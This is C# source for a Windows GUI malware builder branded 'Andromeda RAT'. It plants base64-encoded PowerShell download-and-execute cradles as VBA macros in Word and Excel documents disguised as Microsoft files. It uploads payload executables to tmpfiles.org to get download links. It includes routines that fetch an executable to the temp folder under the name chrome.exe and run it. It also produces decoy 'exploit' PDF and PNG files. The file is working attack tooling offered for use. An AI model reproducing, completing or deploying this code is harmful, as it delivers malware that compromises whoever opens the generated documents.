using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Andromeda_RAT.Properties;
using Aspose.Cells;
using Aspose.Cells.Vba;
using Aspose.Words;
using Aspose.Words.Vba;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Newtonsoft.Json.Linq;

namespace Word;

public class Office : Form
{
	public string client;

	public string api_exe = "api_exe";

	public string _p2 = "a";

	public string _p3 = "p";

	public string _p4 = "_p4";

	public string _p5 = "_p5";

	public string _p6 = "_p6";

	public string url_epxloit;

	public string url_epxloit_exe;

	public bool isActivated;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_4;

	private IContainer icontainer_0;

	private Guna2BorderlessForm guna2BorderlessForm_0;

	private Guna2AnimateWindow guna2AnimateWindow_0;

	private Guna2Panel guna2Panel_0;

	private Guna2ControlBox guna2ControlBox_0;

	private Guna2ControlBox guna2ControlBox_1;

	private Guna2PictureBox guna2PictureBox_0;

	private Guna2Panel guna2Panel_1;

	private Guna2PictureBox guna2PictureBox_1;

	private Guna2DragControl guna2DragControl_0;

	private Guna2PictureBox guna2PictureBox_2;

	private Guna2PictureBox guna2PictureBox_3;

	private Guna2HtmlLabel guna2HtmlLabel_0;

	private Guna2PictureBox guna2PictureBox_4;

	private Guna2PictureBox guna2PictureBox_5;

	private Guna2PictureBox guna2PictureBox_6;

	private Guna2PictureBox guna2PictureBox_7;

	private Guna2ComboBox guna2ComboBox_0;

	private Guna2HtmlLabel guna2HtmlLabel_1;

	private Guna2HtmlLabel guna2HtmlLabel_2;

	private Guna2ComboBox guna2ComboBox_1;

	private Guna2PictureBox guna2PictureBox_8;

	private Guna2PictureBox guna2PictureBox_9;

	internal static Office office_0;

	public bool isExe
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	public bool isExcel
	{
		[CompilerGenerated]
		get
		{
			return bool_1;
		}
		[CompilerGenerated]
		set
		{
			bool_1 = value;
		}
	}

	public bool isWord
	{
		[CompilerGenerated]
		get
		{
			return bool_2;
		}
		[CompilerGenerated]
		set
		{
			bool_2 = value;
		}
	}

	public bool isPdf
	{
		[CompilerGenerated]
		get
		{
			return bool_3;
		}
		[CompilerGenerated]
		set
		{
			bool_3 = value;
		}
	}

	public bool isPng
	{
		[CompilerGenerated]
		get
		{
			return bool_4;
		}
		[CompilerGenerated]
		set
		{
			bool_4 = value;
		}
	}

	public Office()
	{
		icontainer_0 = null;
		InitializeComponent();
	}

	private void Office_Load(object sender, EventArgs e)
	{
		try
		{
            guna2PictureBox_0.Visible = true;
            guna2PictureBox_2.Visible = true;
            guna2PictureBox_1.Visible = true;
            guna2PictureBox_3.Visible = true;
            guna2PictureBox_8.Visible = true;

            guna2HtmlLabel_2.Visible = true;
            guna2ComboBox_1.Visible = true;
            guna2ComboBox_0.Visible = true;
            guna2HtmlLabel_1.Visible = true;
            guna2HtmlLabel_0.Visible = true;
            guna2PictureBox_5.Visible = true;
            guna2PictureBox_6.Visible = true;
            guna2PictureBox_7.Visible = true;
            guna2PictureBox_4.Visible = true;
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
        
        /*
		if (!isActivated)
		{
			Application.Exit();
			return;
		}
		try
		{
			if (isExe)
			{
				guna2PictureBox_0.Visible = true;
			}
			if (isExcel)
			{
				guna2PictureBox_2.Visible = true;
			}
			if (isWord)
			{
				guna2PictureBox_1.Visible = true;
			}
			if (isPdf)
			{
				guna2PictureBox_3.Visible = true;
			}
			if (isPng)
			{
				guna2PictureBox_8.Visible = true;
			}
			guna2HtmlLabel_2.Visible = true;
			guna2ComboBox_1.Visible = true;
			guna2ComboBox_0.Visible = true;
			guna2HtmlLabel_1.Visible = true;
			guna2HtmlLabel_0.Visible = true;
			guna2PictureBox_5.Visible = true;
			guna2PictureBox_6.Visible = true;
			guna2PictureBox_7.Visible = true;
			guna2PictureBox_4.Visible = true;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
		*/
    }

	public string sh(byte[] xx)
	{
		StringBuilder stringBuilder = new StringBuilder();
		foreach (byte value in xx)
		{
			stringBuilder.Append(value);
			stringBuilder.Append(",");
		}
		return stringBuilder.ToString().Remove(checked(stringBuilder.Length - 1));
	}

	private void method_0(string string_0)
	{
		try
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Microsoft Office Exploit | .doc";
			saveFileDialog.FileName = "Microsoft.doc";
			string s = "IEX (New-Object Net.WebClient).DownloadString('" + string_0 + "');oawnduawdnnhn9283h1921nawodanfiawbdniufbnaidwuaifuabiufbaiudbhjawdbafhj";
			byte[] bytes = Encoding.Unicode.GetBytes(s);
			string text = Convert.ToBase64String(bytes);
			string newValue = text ?? "";
			string string_ = Resources.word;
			string_ = string_.Replace("㊛㊜㊝㊞㊟㊠", _p2);
			string_ = string_.Replace("㊥㊔㊓㊤㊣㊒㊑㊢", _p3);
			string_ = string_.Replace("㍾㍽㍻", _p4);
			string_ = string_.Replace("\ud835\ude08\ud835\ude09\ud835\ude0a\ud835\ude0c\ud835\ude0d\ud835\ude0b\ud835\ude0e\ud835\ude0f\ud835\ude0f", _p5);
			string_ = string_.Replace(_p6, newValue);
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = "Word.Resources.template.doc";
			using Stream stream = executingAssembly.GetManifestResourceStream(name);
			Document document = new Document(stream);
			Aspose.Words.Vba.VbaProject vbaProject = document.VbaProject;
			Aspose.Words.Vba.VbaModule vbaModule = new Aspose.Words.Vba.VbaModule();
			vbaModule.Name = "NewModule";
			vbaModule.Type = Aspose.Words.Vba.VbaModuleType.ProceduralModule;
			vbaModule.SourceCode = string_;
			vbaProject.Modules.Add(vbaModule);
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					document.Save("C:\\ProgramData\\modified_document.doc");
					File.Move("C:\\ProgramData\\modified_document.doc", saveFileDialog.FileName);
					return;
				}
				catch (Exception)
				{
					MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void method_1(object sender, EventArgs e)
	{
	}

	private void method_2(object sender, EventArgs e)
	{
	}

	private void method_3(object sender, EventArgs e)
	{
	}

	private async void guna2PictureBox_0_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "|*.exe",
				FileName = "Payload.exe"
			};
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string newValue = sh(File.ReadAllBytes(openFileDialog.FileName));
			string value = Resources.rump.Replace("CLIENT", newValue);
			string path = "C:\\ProgramData\\exploit.jpg";
			File.WriteAllText(path, value);
			HttpClient client = new HttpClient();
			try
			{
				MultipartFormDataContent form = new MultipartFormDataContent();
				try
				{
					ByteArrayContent fileContent = new ByteArrayContent(File.ReadAllBytes(path));
					((HttpContent)fileContent).Headers.ContentType = MediaTypeHeaderValue.Parse("text/plain");
					form.Add((HttpContent)(object)fileContent, "file", Path.GetFileName(path));
					HttpResponseMessage response = await client.PostAsync("https://tmpfiles.org/api/v1/upload", (HttpContent)(object)form);
					response.EnsureSuccessStatusCode();
					JToken responseData = JObject.Parse(await response.Content.ReadAsStringAsync())["data"];
					string url2 = (string)responseData["url"];
					guna2PictureBox_9.Visible = true;
					url2 = url2.Replace("org/", "org/dl/");
					url_epxloit = url2;
				}
				finally
				{
					((IDisposable)form)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Ir o cara e gordo!");
		}
	}

	private void method_4(object sender, PaintEventArgs e)
	{
	}

	private void guna2Panel_1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void guna2PictureBox_1_Click(object sender, EventArgs e)
	{
		try
		{
			method_0(url_epxloit);
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void guna2PictureBox_2_Click(object sender, EventArgs e)
	{
		try
		{
			criar_xls(url_epxloit);
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	public void criar_xls(string valor)
	{
		try
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Microsoft Office Exploit | .xls";
			saveFileDialog.FileName = "Microsoft.xls";
			string s = "IEX (New-Object Net.WebClient).DownloadString('" + valor + "');oawnduawdnnhn9283h1921nawodanfiawbdniufbnaidwuaifuabiufbaiudbhjawdbafhj";
			byte[] bytes = Encoding.Unicode.GetBytes(s);
			string text = Convert.ToBase64String(bytes);
			string newValue = text ?? "";
			string string_ = Resources.word;
			string_ = string_.Replace("㊛㊜㊝㊞㊟㊠", _p2);
			string_ = string_.Replace("㊥㊔㊓㊤㊣㊒㊑㊢", _p3);
			string_ = string_.Replace("㍾㍽㍻", _p4);
			string_ = string_.Replace("\ud835\ude08\ud835\ude09\ud835\ude0a\ud835\ude0c\ud835\ude0d\ud835\ude0b\ud835\ude0e\ud835\ude0f\ud835\ude0f", _p5);
			string_ = string_.Replace(_p6, newValue);
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = "Word.Resources.template_excel.xls";
			using Stream stream = executingAssembly.GetManifestResourceStream(name);
			Workbook workbook = new Workbook(stream);
			Worksheet sheet = workbook.Worksheets[0];
			int index = workbook.VbaProject.Modules.Add(sheet);
			Aspose.Cells.Vba.VbaModule vbaModule = workbook.VbaProject.Modules[index];
			vbaModule.Name = "NewModule";
			vbaModule.Codes = string_;
			workbook.ProtectSharedWorkbook("+@)_#_)@#)(_@$()*!(@)$()@()$()@()$(@(@(<KL<@#<>@KL<M<$KMKK$@");
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					workbook.Save("C:\\ProgramData\\modified_document.xls", Aspose.Cells.SaveFormat.Excel97To2003);
					File.Move("C:\\ProgramData\\modified_document.xls", saveFileDialog.FileName);
					return;
				}
				catch (Exception)
				{
					MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void method_5(object sender, EventArgs e)
	{
	}

	private void method_6(object sender, EventArgs e)
	{
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	private void guna2ControlBox_1_Click(object sender, EventArgs e)
	{
		try
		{
			Application.Exit();
			Application.ExitThread();
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void method_8(object sender, EventArgs e)
	{
	}

	private void guna2ControlBox_0_Click(object sender, EventArgs e)
	{
	}

	private void method_9()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i = checked(i + 1))
		{
			if (string.Compare(processes[i].ProcessName, "chrome", ignoreCase: true) == 0)
			{
				try
				{
					Thread.Sleep(50000);
					new WebClient().DownloadFile(url_epxloit_exe, Interaction.Environ("tmp") + "\\chrome.exe");
					Interaction.Shell(Interaction.Environ("tmp") + "\\chrome.exe");
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void method_10()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i = checked(i + 1))
		{
			if (string.Compare(processes[i].ProcessName, "msedge", ignoreCase: true) == 0)
			{
				try
				{
					Thread.Sleep(50000);
					new WebClient().DownloadFile(url_epxloit_exe, Interaction.Environ("tmp") + "\\chrome.exe");
					Interaction.Shell(Interaction.Environ("tmp") + "\\chrome.exe");
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void method_11()
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Adobe Acrobat |*.pdf";
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		File.Copy(openFileDialog.FileName, "C:\\ProgramData\\exploit.pdf", overwrite: true);
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = "Adobe Acrobat Exploit |*.pdf";
		saveFileDialog.FileName = "Adobe Acrobat Exploit 2023.pdf";
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		if (!(guna2ComboBox_0.Text == "Google Chrome 2023 - Injection - Process [chrome.exe] V3 @Andromeda Fix"))
		{
			if (guna2ComboBox_0.Text == "Microsoft Edge 2023 - Injection - Process [edge.exe] V3 @Andromeda Fix")
			{
				File.Move("C:\\ProgramData\\exploit.pdf", saveFileDialog.FileName);
			}
		}
		else
		{
			File.Move("C:\\ProgramData\\exploit.pdf", saveFileDialog.FileName);
		}
	}

	private async void guna2PictureBox_3_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "|*.*",
				AddExtension = true
			};
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			try
			{
				string path = openFileDialog.FileName;
				HttpClient client = new HttpClient();
				try
				{
					MultipartFormDataContent form = new MultipartFormDataContent();
					try
					{
						ByteArrayContent fileContent = new ByteArrayContent(File.ReadAllBytes(path));
						((HttpContent)fileContent).Headers.ContentType = MediaTypeHeaderValue.Parse("text/plain");
						form.Add((HttpContent)(object)fileContent, "file", Path.GetFileName(path));
						HttpResponseMessage response = await client.PostAsync(api_exe, (HttpContent)(object)form);
						response.EnsureSuccessStatusCode();
						JToken responseData = JObject.Parse(await response.Content.ReadAsStringAsync())["data"];
						string url2 = (string)responseData["url"];
						url2 = url2.Replace("org/", "org/dl/");
						url_epxloit_exe = url2;
						method_11();
					}
					finally
					{
						((IDisposable)form)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)client)?.Dispose();
				}
			}
			catch (Exception)
			{
				MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Sorry, we have a problem, please try again later!", "Andromeda", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void guna2PictureBox_8_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = "Executable File | *.*";
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Microsoft Photos |*.png";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			File.Copy(openFileDialog.FileName, "C:\\ProgramData\\exploit.png", overwrite: true);
			SaveFileDialog saveFileDialog2 = new SaveFileDialog();
			saveFileDialog2.Filter = "Microsoft Photos |*.png";
			saveFileDialog2.FileName = "Microsoft Photos 2023.png";
			if (saveFileDialog2.ShowDialog() == DialogResult.OK)
			{
				File.Copy("C:\\ProgramData\\exploit.png", saveFileDialog2.FileName, overwrite: true);
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		icontainer_0 = new Container();
		ComponentResourceManager resources = new ComponentResourceManager(typeof(Office));
		guna2BorderlessForm_0 = new Guna2BorderlessForm(icontainer_0);
		guna2AnimateWindow_0 = new Guna2AnimateWindow(icontainer_0);
		guna2Panel_0 = new Guna2Panel();
		guna2ControlBox_0 = new Guna2ControlBox();
		guna2ControlBox_1 = new Guna2ControlBox();
		guna2PictureBox_0 = new Guna2PictureBox();
		guna2Panel_1 = new Guna2Panel();
		guna2PictureBox_9 = new Guna2PictureBox();
		guna2PictureBox_8 = new Guna2PictureBox();
		guna2HtmlLabel_2 = new Guna2HtmlLabel();
		guna2ComboBox_1 = new Guna2ComboBox();
		guna2HtmlLabel_1 = new Guna2HtmlLabel();
		guna2ComboBox_0 = new Guna2ComboBox();
		guna2HtmlLabel_0 = new Guna2HtmlLabel();
		guna2PictureBox_5 = new Guna2PictureBox();
		guna2PictureBox_6 = new Guna2PictureBox();
		guna2PictureBox_3 = new Guna2PictureBox();
		guna2PictureBox_7 = new Guna2PictureBox();
		guna2PictureBox_2 = new Guna2PictureBox();
		guna2PictureBox_4 = new Guna2PictureBox();
		guna2PictureBox_1 = new Guna2PictureBox();
		guna2DragControl_0 = new Guna2DragControl(icontainer_0);
		guna2Panel_0.SuspendLayout();
		((ISupportInitialize)guna2PictureBox_0).BeginInit();
		guna2Panel_1.SuspendLayout();
		((ISupportInitialize)guna2PictureBox_9).BeginInit();
		((ISupportInitialize)guna2PictureBox_8).BeginInit();
		((ISupportInitialize)guna2PictureBox_5).BeginInit();
		((ISupportInitialize)guna2PictureBox_6).BeginInit();
		((ISupportInitialize)guna2PictureBox_3).BeginInit();
		((ISupportInitialize)guna2PictureBox_7).BeginInit();
		((ISupportInitialize)guna2PictureBox_2).BeginInit();
		((ISupportInitialize)guna2PictureBox_4).BeginInit();
		((ISupportInitialize)guna2PictureBox_1).BeginInit();
		SuspendLayout();
		guna2BorderlessForm_0.ContainerControl = this;
		guna2BorderlessForm_0.DockIndicatorTransparencyValue = 0.6;
		guna2BorderlessForm_0.TransparentWhileDrag = true;
		guna2Panel_0.BackColor = Color.White;
		guna2Panel_0.Controls.Add(guna2ControlBox_0);
		guna2Panel_0.Controls.Add(guna2ControlBox_1);
		guna2Panel_0.Dock = DockStyle.Top;
		guna2Panel_0.Location = new Point(0, 0);
		guna2Panel_0.MaximumSize = new Size(998, 39);
		guna2Panel_0.MinimumSize = new Size(998, 39);
		guna2Panel_0.Name = "guna2Panel1";
		guna2Panel_0.ShadowDecoration.Enabled = true;
		guna2Panel_0.ShadowDecoration.Shadow = new Padding(5, 1, 1, 10);
		guna2Panel_0.Size = new Size(998, 39);
		guna2Panel_0.TabIndex = 0;
		guna2ControlBox_0.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		guna2ControlBox_0.ControlBoxType = ControlBoxType.MinimizeBox;
		guna2ControlBox_0.FillColor = Color.White;
		guna2ControlBox_0.IconColor = Color.Black;
		guna2ControlBox_0.Location = new Point(897, 5);
		guna2ControlBox_0.Name = "guna2ControlBox3";
		guna2ControlBox_0.Size = new Size(45, 29);
		guna2ControlBox_0.TabIndex = 2;
		guna2ControlBox_0.Click += guna2ControlBox_0_Click;
		guna2ControlBox_1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		guna2ControlBox_1.FillColor = Color.White;
		guna2ControlBox_1.IconColor = Color.Black;
		guna2ControlBox_1.Location = new Point(948, 5);
		guna2ControlBox_1.Name = "guna2ControlBox1";
		guna2ControlBox_1.Size = new Size(45, 29);
		guna2ControlBox_1.TabIndex = 0;
		guna2ControlBox_1.Click += guna2ControlBox_1_Click;
		guna2PictureBox_0.BackColor = Color.Transparent;
		guna2PictureBox_0.Image = (Image)resources.GetObject("picture_exe.Image");
		guna2PictureBox_0.ImageRotate = 0f;
		guna2PictureBox_0.Location = new Point(91, 15);
		guna2PictureBox_0.MaximumSize = new Size(162, 239);
		guna2PictureBox_0.MinimumSize = new Size(162, 239);
		guna2PictureBox_0.Name = "picture_exe";
		guna2PictureBox_0.Size = new Size(162, 239);
		guna2PictureBox_0.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_0.TabIndex = 2;
		guna2PictureBox_0.TabStop = false;
		guna2PictureBox_0.UseTransparentBackground = true;
		guna2PictureBox_0.Visible = false;
		guna2PictureBox_0.Click += guna2PictureBox_0_Click;
		guna2Panel_1.BackColor = Color.White;
		guna2Panel_1.Controls.Add(guna2PictureBox_9);
		guna2Panel_1.Controls.Add(guna2PictureBox_8);
		guna2Panel_1.Controls.Add(guna2HtmlLabel_2);
		guna2Panel_1.Controls.Add(guna2ComboBox_1);
		guna2Panel_1.Controls.Add(guna2HtmlLabel_1);
		guna2Panel_1.Controls.Add(guna2ComboBox_0);
		guna2Panel_1.Controls.Add(guna2HtmlLabel_0);
		guna2Panel_1.Controls.Add(guna2PictureBox_5);
		guna2Panel_1.Controls.Add(guna2PictureBox_6);
		guna2Panel_1.Controls.Add(guna2PictureBox_3);
		guna2Panel_1.Controls.Add(guna2PictureBox_7);
		guna2Panel_1.Controls.Add(guna2PictureBox_2);
		guna2Panel_1.Controls.Add(guna2PictureBox_4);
		guna2Panel_1.Controls.Add(guna2PictureBox_1);
		guna2Panel_1.Controls.Add(guna2PictureBox_0);
		guna2Panel_1.Dock = DockStyle.Fill;
		guna2Panel_1.Location = new Point(0, 39);
		guna2Panel_1.MaximumSize = new Size(998, 490);
		guna2Panel_1.MinimumSize = new Size(998, 490);
		guna2Panel_1.Name = "guna2Panel3";
		guna2Panel_1.ShadowDecoration.Enabled = true;
		guna2Panel_1.ShadowDecoration.Shadow = new Padding(5, 1, 1, 10);
		guna2Panel_1.Size = new Size(998, 490);
		guna2Panel_1.TabIndex = 4;
		guna2Panel_1.Paint += guna2Panel_1_Paint;
		guna2PictureBox_9.BackColor = Color.Transparent;
		guna2PictureBox_9.Image = (Image)resources.GetObject("Img_Green.Image");
		guna2PictureBox_9.ImageRotate = 0f;
		guna2PictureBox_9.Location = new Point(152, 3);
		guna2PictureBox_9.MaximumSize = new Size(40, 41);
		guna2PictureBox_9.MinimumSize = new Size(40, 41);
		guna2PictureBox_9.Name = "Img_Green";
		guna2PictureBox_9.Size = new Size(40, 41);
		guna2PictureBox_9.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_9.TabIndex = 24;
		guna2PictureBox_9.TabStop = false;
		guna2PictureBox_9.UseTransparentBackground = true;
		guna2PictureBox_9.Visible = false;
		guna2PictureBox_8.BackColor = Color.Transparent;
		guna2PictureBox_8.Image = (Image)resources.GetObject("picture_png.Image");
		guna2PictureBox_8.ImageRotate = 0f;
		guna2PictureBox_8.Location = new Point(745, 15);
		guna2PictureBox_8.MaximumSize = new Size(162, 239);
		guna2PictureBox_8.MinimumSize = new Size(162, 239);
		guna2PictureBox_8.Name = "picture_png";
		guna2PictureBox_8.Size = new Size(162, 239);
		guna2PictureBox_8.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_8.TabIndex = 23;
		guna2PictureBox_8.TabStop = false;
		guna2PictureBox_8.UseTransparentBackground = true;
		guna2PictureBox_8.Visible = false;
		guna2PictureBox_8.Click += guna2PictureBox_8_Click;
		guna2HtmlLabel_2.BackColor = Color.Transparent;
		guna2HtmlLabel_2.Font = new System.Drawing.Font("Segoe UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		guna2HtmlLabel_2.ForeColor = Color.Black;
		guna2HtmlLabel_2.Location = new Point(227, 270);
		guna2HtmlLabel_2.MaximumSize = new Size(105, 27);
		guna2HtmlLabel_2.MinimumSize = new Size(105, 27);
		guna2HtmlLabel_2.Name = "guna2HtmlLabel3";
		guna2HtmlLabel_2.Size = new Size(105, 27);
		guna2HtmlLabel_2.TabIndex = 22;
		guna2HtmlLabel_2.Text = "Obfuscation";
		guna2HtmlLabel_2.Visible = false;
		guna2ComboBox_1.BackColor = Color.Transparent;
		guna2ComboBox_1.DrawMode = DrawMode.OwnerDrawFixed;
		guna2ComboBox_1.DropDownStyle = ComboBoxStyle.DropDownList;
		guna2ComboBox_1.FocusedColor = Color.FromArgb(94, 148, 255);
		guna2ComboBox_1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		guna2ComboBox_1.Font = new System.Drawing.Font("Segoe UI", 10f);
		guna2ComboBox_1.ForeColor = Color.FromArgb(68, 88, 112);
		guna2ComboBox_1.ItemHeight = 30;
		guna2ComboBox_1.Items.AddRange(new object[11]
		{
			"Obfuscate - Level - 1", "Obfuscate - Level - 2", "Obfuscate - Level - 3", "Obfuscate - Level - 4", "Obfuscate - Level - 5", "Obfuscate - Level - 6", "Obfuscate - Level - 7", "Obfuscate - Level - 8", "Obfuscate - Level - 9", "Obfuscate - Level - 10",
			"Obfuscate - Level - 11"
		});
		guna2ComboBox_1.Location = new Point(18, 303);
		guna2ComboBox_1.MaximumSize = new Size(314, 0);
		guna2ComboBox_1.MinimumSize = new Size(314, 0);
		guna2ComboBox_1.Name = "guna2ComboBox2";
		guna2ComboBox_1.Size = new Size(314, 36);
		guna2ComboBox_1.TabIndex = 21;
		guna2ComboBox_1.Visible = false;
		guna2HtmlLabel_1.BackColor = Color.Transparent;
		guna2HtmlLabel_1.Font = new System.Drawing.Font("Segoe UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		guna2HtmlLabel_1.ForeColor = Color.Black;
		guna2HtmlLabel_1.Location = new Point(808, 270);
		guna2HtmlLabel_1.MaximumSize = new Size(145, 27);
		guna2HtmlLabel_1.MinimumSize = new Size(145, 27);
		guna2HtmlLabel_1.Name = "guna2HtmlLabel2";
		guna2HtmlLabel_1.Size = new Size(145, 27);
		guna2HtmlLabel_1.TabIndex = 20;
		guna2HtmlLabel_1.Text = "Process Injection";
		guna2HtmlLabel_1.Visible = false;
		guna2ComboBox_0.BackColor = Color.Transparent;
		guna2ComboBox_0.DrawMode = DrawMode.OwnerDrawFixed;
		guna2ComboBox_0.DropDownStyle = ComboBoxStyle.DropDownList;
		guna2ComboBox_0.FocusedColor = Color.FromArgb(94, 148, 255);
		guna2ComboBox_0.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		guna2ComboBox_0.Font = new System.Drawing.Font("Segoe UI", 10f);
		guna2ComboBox_0.ForeColor = Color.FromArgb(68, 88, 112);
		guna2ComboBox_0.ItemHeight = 30;
		guna2ComboBox_0.Items.AddRange(new object[10] { "Google Chrome 2023 - Injection - Process [chrome.exe] V3 @Andromeda Fix", "Microsoft Edge 2023 - Injection - Process [edge.exe] V3 @Andromeda Fix", "Microsoft Office 2022 - Injection - Process [\"edge.exe\"] @Andromeda Fix", "Microsoft Office 2022 - Injection - Process [\"chrome.exe\"] @Andromeda Fix", "Microsoft Office 2022 - Injection - Process [\"ai.exe\"] @Andromeda Fix", "Microsoft Excel 20232- Injection - Process [\"edge.exe\"] @Andromeda Fix", "Microsoft Excel 2022 - Injection - Process [\"chrome.exe\"] @Andromeda Fix", "Microsoft Excel 2022 - Injection -Process [\"ai.exe\"] @Andromeda Fix", "Adobe Acrobat 2023 - Injection - Process [\"Acrobat.exe\"] @Andromeda Fix", "Microsoft - Photos - Injection - Process [\"Microsoft.Photos\"] @Andromeda Fix" });
		guna2ComboBox_0.Location = new Point(338, 303);
		guna2ComboBox_0.MaximumSize = new Size(615, 0);
		guna2ComboBox_0.MinimumSize = new Size(615, 0);
		guna2ComboBox_0.Name = "guna2ComboBox1";
		guna2ComboBox_0.Size = new Size(615, 36);
		guna2ComboBox_0.TabIndex = 19;
		guna2ComboBox_0.Visible = false;
		guna2HtmlLabel_0.BackColor = Color.Transparent;
		guna2HtmlLabel_0.Font = new System.Drawing.Font("Segoe UI", 18f, FontStyle.Regular, GraphicsUnit.Point, 0);
		guna2HtmlLabel_0.ForeColor = Color.Black;
		guna2HtmlLabel_0.Location = new Point(676, 447);
		guna2HtmlLabel_0.MaximumSize = new Size(310, 34);
		guna2HtmlLabel_0.MinimumSize = new Size(310, 34);
		guna2HtmlLabel_0.Name = "guna2HtmlLabel1";
		guna2HtmlLabel_0.Size = new Size(310, 34);
		guna2HtmlLabel_0.TabIndex = 14;
		guna2HtmlLabel_0.Text = "Telegram @Andromeda_RAT ";
		guna2HtmlLabel_0.Visible = false;
		guna2PictureBox_5.BackColor = Color.Transparent;
		guna2PictureBox_5.Image = (Image)resources.GetObject("guna2PictureBox10.Image");
		guna2PictureBox_5.ImageRotate = 0f;
		guna2PictureBox_5.Location = new Point(196, 431);
		guna2PictureBox_5.MaximumSize = new Size(50, 50);
		guna2PictureBox_5.MinimumSize = new Size(50, 50);
		guna2PictureBox_5.Name = "guna2PictureBox10";
		guna2PictureBox_5.Size = new Size(50, 50);
		guna2PictureBox_5.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_5.TabIndex = 18;
		guna2PictureBox_5.TabStop = false;
		guna2PictureBox_5.UseTransparentBackground = true;
		guna2PictureBox_5.Visible = false;
		guna2PictureBox_6.BackColor = Color.Transparent;
		guna2PictureBox_6.Image = (Image)resources.GetObject("guna2PictureBox8.Image");
		guna2PictureBox_6.ImageRotate = 0f;
		guna2PictureBox_6.Location = new Point(135, 431);
		guna2PictureBox_6.MaximumSize = new Size(50, 50);
